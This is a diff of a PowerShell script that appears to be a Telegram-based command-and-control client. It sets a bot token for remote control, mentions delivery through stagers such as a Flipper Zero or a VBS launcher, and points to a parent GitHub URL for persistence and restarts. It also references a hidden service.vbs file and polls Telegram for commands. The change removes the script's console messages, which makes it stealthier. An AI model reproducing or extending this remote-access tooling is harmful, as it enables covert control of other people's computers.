@@ -12,9 +12,8 @@ SEE README FOR MORE INFO
 
 #>
 #---------------------------------------------- SCRIPT SETUP -----------------------------------------------
-$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
-
 # Define Connection Variables
+$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
@@ -30,11 +29,10 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.
 
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
-write-host "Waiting for Chat ID.."
-$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
-if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
-if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-Sleep 10
+    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
+    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
+    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
+    Sleep 10
 }
 
 # Emoji characters and other setup
